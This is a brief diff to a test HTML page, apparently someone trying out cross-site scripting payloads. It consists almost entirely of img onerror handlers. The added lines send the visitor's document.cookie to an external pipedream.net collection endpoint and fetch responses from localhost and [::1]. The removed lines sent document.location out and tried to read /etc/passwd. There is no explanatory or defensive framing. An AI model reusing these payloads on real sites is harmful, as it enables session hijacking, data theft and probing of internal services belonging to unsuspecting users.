@@ -2,7 +2,8 @@
   <body>
     <h1>Test web</h1>
     <p>berhasil gak?</p>
-    <img src=a onerror="fetch('https://eoaqucugsnci8we.m.pipedream.net', {method: 'POST', mode: 'no-cors', body:document.location})">
-    <img src=b onerror="fetch('file:///etc/passwd').then((a)=>a.text().then((b)=>alert(b)))">
+    <img src=a onerror="fetch('https://eoaqucugsnci8we.m.pipedream.net', {method: 'POST', mode: 'no-cors', body:document.cookie})">
+    <img src=b onerror="fetch('http://localhost').then((a)=>a.text().then((b)=>alert(b)))">
+    <img src=b onerror="fetch('http://[::1]').then((c)=>c.text().then((d)=>alert(d)))">
   </body>
 </html>
